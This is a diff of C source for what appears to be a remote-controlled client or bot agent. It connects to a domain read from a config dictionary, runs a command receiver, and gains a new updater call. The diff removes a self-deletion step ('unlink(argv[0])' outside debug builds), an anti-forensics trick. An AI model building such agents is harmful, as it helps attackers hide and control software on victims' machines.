@@ -12,10 +12,11 @@
 #include <sys/ioctl.h>
 #include <string.h>
 
-#include <ram_mem.h>
+#include <dict.h>
 #include <utils.h>
 #include <receiver.h>
 #include <command.h>
+#include <updater.h>
 
 #define RESPONSE_SIZE 16
 
@@ -46,10 +47,6 @@ int main(int argc, char **argv)
 {
     dict_init();
 
-#ifndef DEBUG
-    unlink(argv[0]);
-#endif
-
     int client_fd;
     struct sockaddr_in server_address;
     uint8_t buffer[RESPONSE_SIZE];
@@ -58,7 +55,9 @@ int main(int argc, char **argv)
     uint8_t is_first_cycle = 1;
 
     while (1)
-    {
+    {   
+        updater_init();
+
         if (is_connected(client_fd) == 0 || is_first_cycle == 1)
         {
             if (receiver_init(&client_fd, &server_address, dict_get(DICT_DOMAIN_NAME)) != 0)
